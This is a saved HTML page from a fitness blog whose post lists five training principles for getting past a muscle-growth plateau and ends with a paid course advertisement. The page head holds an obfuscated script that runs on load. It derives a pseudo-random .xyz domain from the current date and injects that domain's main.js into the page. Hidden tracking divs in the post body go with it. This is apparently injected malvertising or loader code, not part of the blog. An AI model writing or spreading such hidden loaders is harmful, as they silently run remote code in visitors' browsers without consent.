<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Reduced fat,">










<meta name="description" content="Our muscles are very smart, but when you try to make your muscles bigger than before, you need to be stronger than before.In order to build more muscles, you need to have a better understanding of how">
<meta name="keywords" content="Reduced fat">
<meta property="og:type" content="article">
<meta property="og:title" content="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free">
<meta property="og:url" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/index.html">
<meta property="og:site_name" content="How to Keep Fit">
<meta property="og:description" content="Our muscles are very smart, but when you try to make your muscles bigger than before, you need to be stronger than before.In order to build more muscles, you need to have a better understanding of how">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/480d6cd0-0888-4686-bcff-a3007ba43c03.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/4e94cdfb-6317-4be2-81c3-7ab30e95a4eb.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/a65c9b2d-7fc2-4f84-a71b-460952ca4e19.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/41ff5aea-8eee-4c4f-ba04-678a54ef1aa1.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/1bfe7253-7b31-4df4-a59f-878b100bb2a2.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/311e79d4-1e59-4922-bd87-85165edfe7e4.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/e4847272-850c-406e-bb3b-80947013257a.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/376f93e5-1c85-4822-b74c-d5ae603c86ae.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/c019bd33-8b59-4e7a-b30e-2e52e43bb076.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/174109d0-c10b-451b-b447-ae3d137ee447.gif">
<meta property="og:updated_time" content="2021-05-06T07:17:20.101Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free">
<meta name="twitter:description" content="Our muscles are very smart, but when you try to make your muscles bigger than before, you need to be stronger than before.In order to build more muscles, you need to have a better understanding of how">
<meta name="twitter:image" content="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/480d6cd0-0888-4686-bcff-a3007ba43c03.gif">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free | How to Keep Fit</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">How to Keep Fit</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">How to Keep Fit</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>


 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
                            
<div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="15af66dea7db40aeac9404abd8ac7ee3" style="display: none"></div>
<div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="957010872ca54cf98941765c8f125165" style="display: none"></div>
<div class="_fa7cdd4c68507744" data-zone="1f18e43b8b0e495c9b6b7be51eb2c8c2" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>


  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Thomas">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="How to Keep Fit">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-04-06T00:00:00+08:00">
                2021-04-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/480d6cd0-0888-4686-bcff-a3007ba43c03.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>Our muscles are very smart, but when you try to make your muscles bigger than before, you need to be stronger than before.<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/4e94cdfb-6317-4be2-81c3-7ab30e95a4eb.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>In order to build more muscles, you need to have a better understanding of how your muscles work. In most cases, we choose random and more intensive training as a tool to stimulate muscle growth, ignoring how and why muscles grow.<br>Many small partners will worry that they will reach the bottleneck after training to a certain extent, and the speed of muscle growth will slow down or even not grow much. Today, we summarize five principles for your reference.<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/a65c9b2d-7fc2-4f84-a71b-460952ca4e19.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br><strong>1. Always change some training details</strong><br>No matter how interesting your training style is, your body will adapt quickly, and as a result, your muscles will stop building. If you repeat the same training all the time, your muscles will quickly adapt to your training method. In other words, the muscle stops growing. Many people think that their success is because they do it again with a certain weight, or five pounds more than they used to. But if that’s the only way you use it, it won’t work.<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/41ff5aea-8eee-4c4f-ba04-678a54ef1aa1.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>Every exercise tries to change some details: the number of repetitions in each group, the contraction time of the muscles, the weight used, the rest time between groups, the order and type of exercise, so that your muscles know what your goal is.<br><strong>2. Give the muscles enough space to adapt</strong><br>This principle seems to contradict the former one, but it is not. It’s like the relationship between yin and Yang. You need to put enough pressure on the muscles to stimulate growth, but you have to let them repair themselves. Because muscles only grow when they’re resting.<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/1bfe7253-7b31-4df4-a59f-878b100bb2a2.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>Don’t ignore it, or you’ll drain yourself. Whether you want better exercise, more strength or better form, you need to arrange the recovery process in training, otherwise you will never be able to maximize muscle growth.<br><strong>3. Don’t neglect diet</strong><br>Rest is a necessary condition for muscle growth, and proper nutrition is one of the most important factors for muscle growth. Everything you eat provides the raw material for muscle growth. We can give you a precise recipe, the time and quantity of each meal, but we won’t do it. All you have to do is eat enough food.<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/311e79d4-1e59-4922-bd87-85165edfe7e4.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>Although the “synthesis window” after training has been controversial, it is still a good time. Take in some easily absorbed protein. Of course, in your own diet, arrange enough healthy nutrition every day. Exercise at least 3-4 times a week, every part of the body needs to practice, 3 months for a fitness program.<br><strong>4. After a while, you need to change your movements</strong><br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/e4847272-850c-406e-bb3b-80947013257a.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>Muscles are very smart, they will know what you want to do soon, that is, they will adapt quickly. You can change some small details every day while keeping most of the details unchanged, but after 6-8 weeks, the muscles will adapt. That’s why it changes a lot every 6-8 weeks. It’s hard because you need to change and learn something new, which is the best way.<br><strong>5. Do self weight training first</strong><br>An effective way to stimulate muscle growth is to train with your own weight. In the process, if you don’t lift your weight, you also need to use some muscles to stabilize your weight and body. These stable muscles are important tissues to help you stay strong and healthy and to help you avoid injury. When you train with equipment, the effect is different.<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/376f93e5-1c85-4822-b74c-d5ae603c86ae.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>After warming up, the first step is weight training. This is the most important thing you have to do. For example, push ups are a good self weight training movement. Fixed equipment is used as a follow-up supplementary training to increase some training ability or achieve your specific goal.<br>If you want to get a better effect of muscle enhancement training, you need to constantly find different training skills, constantly strengthen training, and find your own actions to break through. In this way, you will make faster progress. OK, that’s all for today’s sharing. If you like our content, remember to press one button three times.</p>
<blockquote>
<p>One Friday exercise, muscle enhancement plan, scientific fitness, take you less detours, hurry to keep up!<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/c019bd33-8b59-4e7a-b30e-2e52e43bb076.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"><br>special column<br>Muscle enhancement plan, one week exercise, scientific muscle enhancement<br>Author: Private Fitness King<br>99 yuan<br>133 bought<br>see<br><img src="http://doumaiy.xyz/2021/04/06/How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free/174109d0-c10b-451b-b447-ae3d137ee447.gif" alt="How to increase muscle bottleneck period to do Try these five training methods to make your muscle gain free"></p>
</blockquote>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Reduced-fat/" rel="tag"># Reduced fat</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/04/05/She started to work out at the age of 30 and became a new fitness girl at the age of 50. How did she do it/" rel="next" title="She started to work out at the age of 30 and became a new fitness girl at the age of 50. How did she do it">
                <i class="fa fa-chevron-left"></i> She started to work out at the age of 30 and became a new fitness girl at the age of 50. How did she do it
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/04/07/Stick to rope skipping for 10 weeks, what changes will your body have Fitness brother's personal experience tells you the answer/" rel="prev" title="Stick to rope skipping for 10 weeks, what changes will your body have Fitness brother's personal experience tells you the answer">
                Stick to rope skipping for 10 weeks, what changes will your body have Fitness brother's personal experience tells you the answer <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Thomas</p>
              <p class="site-description motion-element" itemprop="description">How to Keep Fit</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">59</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Thomas</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
